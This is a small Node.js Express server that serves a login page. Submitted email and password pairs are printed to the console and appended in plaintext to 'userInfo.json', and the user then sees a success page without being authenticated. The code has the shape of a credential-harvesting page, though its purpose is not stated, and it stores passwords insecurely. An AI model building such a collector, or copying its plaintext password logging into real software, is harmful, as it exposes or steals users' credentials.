var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
app.use(bodyParser.urlencoded({extended:true}));


app.get("/",function(req,res){
    res.sendFile(__dirname + "/views/login.html");
});

app.post("/",function(req,res){
    var username = req.body.usermail;
    var password = req.body.userpass;
    password = JSON.stringify(password,null,2);
    username = JSON.stringify(username,null,2);
    console.log(username+"->"+password);
    var data = username+"->"+password+"\n";
    fs.appendFile('userInfo.json',data,function(err){
        if(err){
            console.log(err);
        }
    })
    res.sendFile(__dirname + "/views/success.html");
});
app.listen(3000,function(){
    console.log("Server listening on port 3000");
});